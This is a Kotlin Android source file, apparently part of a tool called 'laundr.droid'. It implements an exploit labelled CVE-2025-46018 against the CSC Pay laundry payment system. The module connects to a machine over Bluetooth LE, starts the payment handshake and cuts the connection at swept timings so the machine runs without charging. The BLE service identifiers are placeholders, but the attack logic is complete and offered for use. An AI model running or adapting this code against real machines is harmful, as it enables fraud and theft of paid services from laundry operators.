package com.laundr.droid.ble

import android.annotation.SuppressLint
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothGattCharacteristic
import android.bluetooth.BluetoothProfile
import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow

/**
 * CSC Payment Bypass Exploit Module
 * CVE-2025-46018: Bluetooth-based payment bypass vulnerability in CSC Pay Mobile App
 *
 * VULNERABILITY DESCRIPTION:
 * The CSC Pay app initiates BLE connection to laundry machines for payment.
 * If Bluetooth is disabled at a specific point during the authentication handshake,
 * the machine activates without completing the payment transaction.
 *
 * TESTING METHODOLOGY:
 * 1. Connect to CSC device via BLE
 * 2. Initiate payment handshake
 * 3. Disconnect at precise timing before payment confirmation
 * 4. Machine should start without charging
 */

enum class ExploitState {
    IDLE,
    SCANNING_FOR_CSC,
    CONNECTING,
    CONNECTED,
    INITIATING_PAYMENT,
    TIMING_DISCONNECT,  // Critical phase
    DISCONNECTING,
    SUCCESS,
    FAILED
}

data class ExploitResult(
    val success: Boolean,
    val message: String,
    val timing: Long,  // ms from connect to disconnect
    val device: String
)

class CSCExploit(private val context: Context) {

    companion object {
        private const val TAG = "CSCExploit"

        // Known CSC BLE characteristics (needs research/capture)
        // These are placeholders - real UUIDs need to be captured from actual CSC devices
        const val CSC_PAYMENT_SERVICE = "0000fff0-0000-1000-8000-00805f9b34fb"
        const val CSC_PAYMENT_CHAR = "0000fff1-0000-1000-8000-00805f9b34fb"
        const val CSC_STATUS_CHAR = "0000fff2-0000-1000-8000-00805f9b34fb"

        // Timing windows to test (ms)
        val DISCONNECT_TIMINGS = listOf(100L, 250L, 500L, 750L, 1000L, 1500L, 2000L)
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private var bluetoothGatt: BluetoothGatt? = null

    private val _state = MutableStateFlow(ExploitState.IDLE)
    val state: StateFlow<ExploitState> = _state.asStateFlow()

    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()

    private val _results = MutableStateFlow<List<ExploitResult>>(emptyList())
    val results: StateFlow<List<ExploitResult>> = _results.asStateFlow()

    private var connectTime: Long = 0
    private var currentTiming: Long = 0

    private val gattCallback = object : BluetoothGattCallback() {

        @SuppressLint("MissingPermission")
        override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
            when (newState) {
                BluetoothProfile.STATE_CONNECTED -> {
                    connectTime = System.currentTimeMillis()
                    addLog("CONNECTED - Starting timer for disconnect at ${currentTiming}ms")
                    _state.value = ExploitState.CONNECTED

                    // Discover services
                    gatt.discoverServices()
                }
                BluetoothProfile.STATE_DISCONNECTED -> {
                    val elapsed = System.currentTimeMillis() - connectTime
                    addLog("DISCONNECTED after ${elapsed}ms")

                    if (_state.value == ExploitState.TIMING_DISCONNECT) {
                        // We intentionally disconnected - record result
                        val result = ExploitResult(
                            success = true,  // We disconnected successfully
                            message = "Disconnect at ${currentTiming}ms - Check if machine activated",
                            timing = elapsed,
                            device = gatt.device.address
                        )
                        _results.value = _results.value + result
                        _state.value = ExploitState.SUCCESS
                    } else {
                        _state.value = ExploitState.IDLE
                    }

                    bluetoothGatt?.close()
                    bluetoothGatt = null
                }
            }
        }

        @SuppressLint("MissingPermission")
        override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
            if (status == BluetoothGatt.GATT_SUCCESS) {
                addLog("Services discovered - ${gatt.services.size} services")

                gatt.services.forEach { service ->
                    addLog("  SVC: ${service.uuid}")
                    service.characteristics.forEach { char ->
                        addLog("    CHR: ${char.uuid}")
                    }
                }

                _state.value = ExploitState.INITIATING_PAYMENT

                // Schedule disconnect at specified timing
                scope.launch {
                    delay(currentTiming)
                    if (_state.value == ExploitState.INITIATING_PAYMENT ||
                        _state.value == ExploitState.CONNECTED) {
                        _state.value = ExploitState.TIMING_DISCONNECT
                        addLog(">>> TIMING DISCONNECT NOW <<<")
                        gatt.disconnect()
                    }
                }

                // Try to find and interact with payment characteristics
                tryPaymentInteraction(gatt)
            }
        }

        override fun onCharacteristicRead(
            gatt: BluetoothGatt,
            characteristic: BluetoothGattCharacteristic,
            value: ByteArray,
            status: Int
        ) {
            val hex = value.joinToString(" ") { "%02X".format(it) }
            addLog("READ ${characteristic.uuid}: $hex")
        }

        override fun onCharacteristicWrite(
            gatt: BluetoothGatt,
            characteristic: BluetoothGattCharacteristic,
            status: Int
        ) {
            addLog("WRITE ${characteristic.uuid}: status=$status")
        }

        override fun onCharacteristicChanged(
            gatt: BluetoothGatt,
            characteristic: BluetoothGattCharacteristic,
            value: ByteArray
        ) {
            val hex = value.joinToString(" ") { "%02X".format(it) }
            addLog("NOTIFY ${characteristic.uuid}: $hex")
        }
    }

    @SuppressLint("MissingPermission")
    private fun tryPaymentInteraction(gatt: BluetoothGatt) {
        // Look for known CSC services or any writable characteristics
        gatt.services.forEach { service ->
            service.characteristics.forEach { char ->
                val props = char.properties

                // Enable notifications on readable/notify characteristics
                if ((props and BluetoothGattCharacteristic.PROPERTY_NOTIFY) != 0) {
                    gatt.setCharacteristicNotification(char, true)
                    addLog("Enabled notify: ${char.uuid}")
                }

                // Try reading readable characteristics
                if ((props and BluetoothGattCharacteristic.PROPERTY_READ) != 0) {
                    gatt.readCharacteristic(char)
                }
            }
        }
    }

    @SuppressLint("MissingPermission")
    fun runExploit(device: BluetoothDevice, disconnectTiming: Long = 500L) {
        if (_state.value != ExploitState.IDLE) {
            addLog("Exploit already running")
            return
        }

        currentTiming = disconnectTiming
        addLog("=== CVE-2025-46018 EXPLOIT START ===")
        addLog("Target: ${device.address}")
        addLog("Disconnect timing: ${disconnectTiming}ms")

        _state.value = ExploitState.CONNECTING

        bluetoothGatt = device.connectGatt(
            context,
            false,
            gattCallback,
            BluetoothDevice.TRANSPORT_LE
        )
    }

    @SuppressLint("MissingPermission")
    fun runTimingSweep(device: BluetoothDevice) {
        scope.launch {
            addLog("=== TIMING SWEEP START ===")
            addLog("Testing ${DISCONNECT_TIMINGS.size} timing values")

            for (timing in DISCONNECT_TIMINGS) {
                if (_state.value != ExploitState.IDLE) {
                    // Wait for previous test to complete
                    while (_state.value != ExploitState.IDLE &&
                           _state.value != ExploitState.SUCCESS) {
                        delay(100)
                    }
                    delay(1000)  // Wait between tests
                }

                addLog("\n--- Testing ${timing}ms ---")
                runExploit(device, timing)

                // Wait for this test to complete
                while (_state.value != ExploitState.IDLE &&
                       _state.value != ExploitState.SUCCESS) {
                    delay(100)
                }

                // Reset state for next test
                _state.value = ExploitState.IDLE
            }

            addLog("=== TIMING SWEEP COMPLETE ===")
            addLog("Results: ${_results.value.size} tests completed")
        }
    }

    @SuppressLint("MissingPermission")
    fun abort() {
        addLog("ABORT requested")
        bluetoothGatt?.disconnect()
        bluetoothGatt?.close()
        bluetoothGatt = null
        _state.value = ExploitState.IDLE
    }

    fun reset() {
        abort()
        _results.value = emptyList()
        _log.value = emptyList()
    }

    private fun addLog(message: String) {
        val timestamp = java.text.SimpleDateFormat("HH:mm:ss.SSS", java.util.Locale.US)
            .format(java.util.Date())
        val logEntry = "[$timestamp] $message"
        _log.value = _log.value + logEntry
        Log.d(TAG, message)
    }

    fun getLogText(): String = _log.value.joinToString("\n")

    fun getResultsSummary(): String {
        if (_results.value.isEmpty()) return "No results yet"

        return buildString {
            appendLine("=== EXPLOIT RESULTS ===")
            _results.value.forEachIndexed { index, result ->
                appendLine("Test ${index + 1}:")
                appendLine("  Device: ${result.device}")
                appendLine("  Timing: ${result.timing}ms")
                appendLine("  Result: ${result.message}")
            }
        }
    }
}
